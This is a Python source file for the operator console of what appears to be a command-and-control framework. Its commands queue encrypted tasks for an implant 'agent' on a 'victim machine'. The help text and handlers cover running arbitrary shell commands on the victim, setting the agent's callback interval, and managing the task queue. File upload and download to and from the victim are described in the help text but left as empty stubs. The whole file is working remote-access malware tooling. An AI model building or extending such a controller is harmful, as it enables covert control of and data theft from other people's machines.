#!/usr/bin/python

import os
from tabulate import tabulate
from core.utils import *
from core.encryption import *

def interact_help(arg, obj):
    normal("Interact Help")
    normal("    help: print this help message")
    normal("        help -- print help")
    normal("")
    normal("    back: go back to main server, does not shutdown agent")
    normal("        back -- go back")
    normal("")
    normal("    clear: clear all output from terminal")
    normal("        clear -- clear screen")
    normal("")
    normal("    shell: executes command on victim machine")
    normal("        shell \"whoami /all\" -- executes command \"whoami /all\" on victim machine")
    normal("")
    normal("    download: download file from victim machine onto our machine")
    normal("        download -r ../Desktop/file -l /tmp/file -- download from victim's ../Desktop/file and save to local path /tmp/file")
    normal("")
    normal("    upload: upload file from our machine onto victim machine")
    normal("        upload -l ../Desktop/file -r /tmp/file -- upload from our ../Desktop/file to victim's /tmp/file")
    normal("")
    normal("")
    normal("    sleep: change the time interval where agent calls back")
    normal("        sleep 10 -- agent calls back every 10 seconds")
    normal("        sleep 0 -- agent becomes interactive")
    normal("")
    normal("    tasks: view/delete tasks")
    normal("        tasks -- list all tasks given to agent")
    normal("        tasks -d TASK_ID -- delete task with id of TASK_ID")
    return

def interact_back(arg, obj):
    return "back"

def interact_clear(arg, obj):
    os.system("clear")
    return

def interact_shell(arg, obj):
    if len(arg) == 0:
        return

    # process input
    cmd = ""
    for tok in arg:
        cmd += tok + " "
    cmd = cmd[:-1]
    cmd = f"shell {cmd}"

    success(f"[+] Tasked agent to run command: {cmd}")

    cmd = encrypt(cmd)
    obj.add_task(cmd)

def interact_upload(arg, obj):
    pass

def interact_download(arg, obj):
    pass

def interact_sleep(arg, obj):
    if len(arg) == 0:
        return

    # process input
    cmd = ""
    for tok in arg:
        cmd += tok + " "
    cmd = cmd[:-1]
    cmd = f"sleep {cmd}"

    success(f"[+] Tasked agent to callback every {cmd} seconds")

    cmd = encrypt(cmd)
    obj.add_task(cmd)    

def interact_tasks(arg, obj):
    if len(arg) == 0:
        # show tasks
        display = []
        q = obj.get_task_queue()
        for task in q:
            display.append([q.index(task), decrypt(task)])
        print(("\n\n" + tabulate(display, ["ID", "Task"], "simple") + "\n\n"))
        return

    if "-d" in arg:
        # delete task
        todelete = int(arg[arg.index("-d") + 1])
        if todelete < 0 or todelete > (len(obj.task_queue.buf) - 1):
            warn(f"[-] Task {todelete} does not exist")
            return

        obj.task_queue.buf.pop(todelete)
        success(f"[+] Task {todelete} is deleted")
    return

jumptable = {}
jumptable["interact_help"] = interact_help
jumptable["interact_back"] = interact_back
jumptable["interact_clear"] = interact_clear
jumptable["interact_shell"] = interact_shell
jumptable["interact_upload"] = interact_upload
jumptable["interact_download"] = interact_download
jumptable["interact_sleep"] = interact_sleep
jumptable["interact_tasks"] = interact_tasks

def execute(cmd, arg, obj):
    try:
        return jumptable[cmd](arg, obj)
    except Exception as e:
        print(e)
        # interact_help("", None)
        warn("[-] Invalid option, check help")
        return None